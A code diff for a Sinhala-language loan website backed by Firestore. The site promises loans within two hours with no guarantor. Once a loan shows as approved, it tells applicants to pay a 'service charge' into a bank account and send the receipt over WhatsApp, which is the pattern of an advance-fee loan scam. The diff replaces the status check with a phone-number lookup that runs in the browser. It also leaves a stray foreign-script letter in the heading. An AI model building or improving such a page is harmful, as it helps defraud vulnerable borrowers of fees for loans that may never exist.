@@ -38,7 +38,7 @@
         <h3 style="text-align: center; color: #2e7d32; margin-top: 0;">✨ සාර්ථකයි!</h3>
         <p style="text-align: center; font-weight: bold; color: #388e3c; font-size: 16px;">ඔබගේ ණය අයදුම්පත අනුමත කර ඇත.</p>
         <hr>
-        <p><strong>ಅනුමත කළ ණය මුදල:</strong> <span id="dispAmount" style="color: #d32f2f; font-size: 18px; font-weight: bold;"></span></p>
+        <p><strong>અනුමත කළ ණය මුදල:</strong> <span id="dispAmount" style="color: #d32f2f; font-size: 18px; font-weight: bold;"></span></p>
         <p><strong>සේවා ගාස්තුව:</strong> <span id="dispCharge" style="color: #d32f2f; font-size: 18px; font-weight: bold;"></span></p>
         <hr>
         <p><strong>බැංකු ගිණුම් විස්තර (BOC):</strong></p>
@@ -49,9 +49,10 @@
         <div class="info-box" style="margin-top: 15px;">
             📌 <strong>විශේෂ දැනුම්දීමයි:</strong> ඉහත සඳහන් කළ බැංකු ගිණුමට ඔබට ලබාගන්නා මුදලට අදාළ Service Charge (සේවා ගාස්තුව) බැංකුගත කර, එහි රිසිට්පත (Receipt) අපගේ WhatsApp වෙත එවන්න.
         </div>
+        <button onclick="location.reload()" style="background: #007BFF; margin-top: 10px;">ආපසු යන්න</button>
     </div>
 
-    <!-- ණය ඉල්ලුම්පත්‍රය සහ අනෙකුත් විස්තර (සාමාන්‍ය අය සඳහා) -->
+    <!-- ණය ඉල්ලුම්පත්‍රය සහ අනෙකුත් විස්තර -->
     <div id="mainContent">
         <div class="details-section">
             <strong>🌟 අපගේ විශේෂත්වය:</strong> කිසිදු සංකීර්ණ ඇපකරුවෙකු නොමැතුව, ඉතා සුදුසුකම් යටතේ පැය 2ක් ඇතුළත ඔබගේ මුදල් ලබා ගැනීමේ පහසුකම අපි සපයන්නෙමු.
@@ -99,29 +100,21 @@
         </ul>
 
         <hr>
-        <h3>❓ නිතර අසන ප්‍රශ්න (FAQ)</h3>
-        <div class="faq-q">1. මට කොතෙක් ඉක්මනින් ණය මුදල ලබාගත හැකිද?</div>
-        <div class="faq-a">සර්විස් චාර්ජ් එක තහවුරු කර පැය 2ක් ඇතුළත ඔබගේ ගිණුමට මුදල් බැංකුගත කෙරේ.</div>
 
-        <div class="faq-q">2. ඇපකරුවන් අවශ්‍යද?</div>
-        <div class="faq-a">නැත, මූලික හැඳුනුම්පත් සහ ලිපිනය තහවුරු කිරීම පමණක් ප්‍රමාණවත් වේ.</div>
-
-        <hr>
-
-        <!-- ණය ඉල්ලුම්පත්‍රය (Apply Form) -->
+        <!-- ණය ඉල්ලුම්පත්‍රය සහ තත්ත්වය පරීක්ෂා කිරීම (Apply / Check Form) -->
         <div id="formSection">
-            <h2>📩 ණය ඉල්ලුම්පත්‍රය (Apply Form)</h2>
+            <h2>📩 ණය ඉල්ලුම්පත්‍රය (Apply / Check Status)</h2>
             <form id="loanForm">
-                <label>නම (Full Name):</label>
-                <input type="text" id="name" required placeholder="ඔබගේ සම්පූර්ණ නම ලියන්න">
+                <label>නම (Full Name) - අලුතින් ඉල්ලනවා නම් පමණයි:</label>
+                <input type="text" id="name" placeholder="ඔබගේ සම්පූර්ණ නම ලියන්න">
 
-                <label>දුරකථන අංකය (Phone Number):</label>
-                <input type="tel" id="phone" required placeholder="දුරකථන අංකය ලියන්න">
+                <label>දුරකථන අංකය (Phone Number) *:</label>
+                <input type="tel" id="phone" required placeholder="ඔබගේ දුරකථන අංකය ලියන්න">
 
-                <label>ඉල්ලන ණය මුදල (Loan Amount):</label>
-                <input type="number" id="amount" required placeholder="අවශ්‍ය ණය මුදල ලියන්න">
+                <label>ඉල්ලන ණය මුදල (Loan Amount) - අලුතින් ඉල්ලනවා නම් පමණයි:</label>
+                <input type="number" id="amount" placeholder="අවශ්‍ය ණය මුදල ලියන්න">
 
-                <button type="submit">Loan එක ඉල්ලන්න (Apply)</button>
+                <button type="submit">ඉල්ලුම් කරන්න / තත්ත්වය පරීක්ෂා කරන්න</button>
             </form>
         </div>
     </div>
@@ -148,42 +141,78 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // Form Submit කිරීම
+    // Form Submit / Check Status කිරීම
     document.getElementById("loanForm").addEventListener("submit", async (e) => {
         e.preventDefault();
-        const name = document.getElementById("name").value;
-        const phone = document.getElementById("phone").value;
-        const amount = document.getElementById("amount").value;
+        const phone = document.getElementById("phone").value.trim();
+        const name = document.getElementById("name").value.trim();
+        const amount = document.getElementById("amount").value.trim();
         const msg = document.getElementById("msg");
 
+        msg.style.display = "block";
+        msg.style.background = "#e2e3e5";
+        msg.style.color = "#383d41";
+        msg.style.padding = "10px";
+        msg.innerText = "පරීක්ෂා කරමින් පවතී...";
+
         try {
-            // Firestore වෙත ඩේටා යැවීම සහ Document ID එක ලබාගැනීම
-            const docRef = await addDoc(collection(db, "loans"), {
-                name: name,
-                phone: phone,
-                amount: amount,
-                status: "Pending",
-                createdAt: new Date()
-            });
+            // පළමුව බලනවා මේ දුරකථන අංකයෙන් මීට පෙර ණය ඉල්ලීමක් කර ඇද්දැයි කියා
+            const q = query(collection(db, "loans"), where("phone", "==", phone));
+            const querySnapshot = await getDocs(q);
 
-            // මෙම ෆෝන් එකට පමණක් අදාළ ID එක සේව් කරගැනීම (නැකි අයට අංක ගහන්න ඕනේ නැත)
-            localStorage.setItem("myLoanId", docRef.id);
+            if (!querySnapshot.empty) {
+                // අංකය දැනටමත් ඩේටාබේස් එකේ ඇත
+                let isApproved = false;
+                querySnapshot.forEach((docSnap) => {
+                    const data = docSnap.data();
+                    if (data.status === "Approved") {
+                        isApproved = true;
+                        // අනුමත වී ඇත නම් එම කාඩ් එක පමණක් පෙන්වීම
+                        document.getElementById("mainContent").style.display = "none";
+                        document.getElementById("approvalCard").style.display = "block";
+                        document.getElementById("dispAmount").innerText = "රු. " + (data.approvedAmount || data.amount) + "/=";
+                        document.getElementById("dispCharge").innerText = data.serviceCharge || "රු. 5,500/=";
+                        msg.style.display = "none";
+                    }
+                });
 
-            msg.style.display = "block";
-            msg.style.background = "#d4edda";
-            msg.style.color = "#155724";
-            msg.style.padding = "15px";
-            msg.style.borderRadius = "5px";
-            msg.style.fontSize = "16px";
-            msg.style.fontWeight = "bold";
-            msg.style.textAlign = "center";
-            msg.style.border = "1px solid #c3e6cb";
-            msg.innerText = "✨ ඔබගේ ණය ඉල්ලීම සාර්ථකයි! පරීක්ෂා කර බලා දන්වන්නම්.";
+                if (!isApproved) {
+                    msg.style.background = "#fff3cd";
+                    msg.style.color = "#856404";
+                    msg.style.padding = "15px";
+                    msg.style.borderRadius = "5px";
+                    msg.innerText = "⏳ ඔබගේ ණය ඉල්ලීම තවමත් සමාලෝචනය වෙමින් (Pending) පවතී.";
+                }
+            } else {
+                // අංකය නැත, එහෙනම් අලුත් ඉල්ලීමක් ලෙස සේව් කිරීම (නම සහ මුදල් අනිවාර්යයි)
+                if (!name || !amount) {
+                    msg.style.background = "#f8d7da";
+                    msg.style.color = "#721c24";
+                    msg.style.padding = "15px";
+                    msg.style.borderRadius = "5px";
+                    msg.innerText = "⚠️ මෙම අංකයෙන් ණය ඉල්ලීමක් හමු නොවීය. අලුතින් ඉල්ලුම් කිරීමට කරුණාකර 'නම' සහ 'ණය මුදල' ඇතුළත් කරන්න.";
+                    return;
+                }
 
-            document.getElementById("loanForm").reset();
+                await addDoc(collection(db, "loans"), {
+                    name: name,
+                    phone: phone,
+                    amount: amount,
+                    status: "Pending",
+                    createdAt: new Date()
+                });
+
+                msg.style.background = "#d4edda";
+                msg.style.color = "#155724";
+                msg.style.padding = "15px";
+                msg.style.borderRadius = "5px";
+                msg.style.fontWeight = "bold";
+                msg.innerText = "✨ ඔබගේ ණය ඉල්ලීම සාර්ථකයි! පරීක්ෂා කර බලා දන්වන්නම්.";
+
+                document.getElementById("loanForm").reset();
+            }
 
         } catch (error) {
-            msg.style.display = "block";
             msg.style.background = "#f8d7da";
             msg.style.color = "#721c24";
             msg.style.padding = "15px";
@@ -191,36 +220,6 @@
             msg.innerText = "දෝෂයක් සිදු විය: " + error.message;
         }
     });
-
-    // ණය අනුමත වී ඇද්දැයි ස්වයංක්‍රීයව පරීක්ෂා කිරීම (මෙම ඩිවයිසයට පමණි)
-    async function checkMyStatus() {
-        const myId = localStorage.getItem("myLoanId");
-        if (!myId) return;
-
-        try {
-            const querySnapshot = await getDocs(collection(db, "loans"));
-            querySnapshot.forEach((docSnap) => {
-                if (docSnap.id === myId) {
-                    const data = docSnap.data();
-                    if (data.status === "Approved") {
-                        // වෙනත් විස්තර සඟවා, අනුමත වූ කාඩ් එක පමණක් පෙන්වීම
-                        document.getElementById("mainContent").style.display = "none";
-                        document.getElementById("approvalCard").style.display = "block";
-                        document.getElementById("dispAmount").innerText = "රු. " + (data.approvedAmount || data.amount) + "/=";
-                        document.getElementById("dispCharge").innerText = data.serviceCharge || "රු. 5,500/=";
-                    }
-                }
-            });
-        } catch (err) {
-            console.error("Error checking status:", err);
-        }
-    }
-
-    // පිටුව ලෝඩ් වූ විට සහ සෑම තත්පර 5කට වරක්ම ස්වයංක්‍රීයව චෙක් වීම
-    window.onload = function() {
-        checkMyStatus();
-        setInterval(checkMyStatus, 5000);
-    }
 </script>
 
 </body>
